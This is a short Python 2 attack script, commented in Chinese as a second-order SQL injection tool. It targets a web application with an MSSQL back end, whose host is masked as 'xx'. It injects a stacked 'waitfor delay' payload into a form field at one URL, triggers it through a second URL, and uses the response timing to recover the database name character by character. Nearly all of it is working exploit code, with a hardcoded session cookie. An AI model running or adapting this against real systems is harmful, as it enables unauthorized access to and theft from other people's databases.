# encoding:utf8
import time
import requests
import sys

__author__ = 'whois'
__date__ = '2017/10/14'
"""
    SQL二阶注入
    Requests  -> url1
    Responser -> url2
"""


url1 = "http://xx/sgsz/pages/byproject.htm?command=detail&node=root"
url2 = "http://xx/sgsz/pages/byproject.htm?command=grid&node=root&searchtype=0&start=0&limit=50"

headers = {
            'user-agent':'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04',
            'Cookie': 'JSESSIONID=FE3222D7A15A57361E2771592277874B'
        }

function = "db_name()"    
payloads = '0123456789abcdefghijklmnopqrstuvwxyz@_-.'

db_length = 9


def sql():

    db_name = ''

    for num in xrange(1, db_length+1):
    
        for p in payloads:
            
            s = "';if(ascii(substring({0},{1},1)))={2} waitfor delay '0:0:5' --".format(function,num,ord(p))
    
            url1_data = {"searchtype": "0", "name1": "", "name": "{0}".format(s), "flowstatus1": "", "flowstatus": "-1,0,1,2",   "type": "1,2,3", "author": "", "prjname": "", "startdate1": "", "enddate1": "", "createdate1": "", "fenlei":     "", "leibie": "", "keywords1": "", "code": "", "startdate2": "", "enddate2": "", "createdate2": ""}
    
            start_time = time.time()
    
            try:
                r1 = requests.post(url1, data=url1_data, headers=headers, timeout=8)
                r2 = requests.get(url2, headers=headers, timeout=8)
            except Exception as err:
                print e
                print "[x] Requests is error"
                exit(1)
    
            if time.time() - start_time > 5:
                db_name += p
                sys.stdout.write('\r'+db_name)
                break

    return db_name

if __name__ == '__main__':
    db_name = sql()
    print "\n[+] MSSQL DBname is {0}".format(db_name)
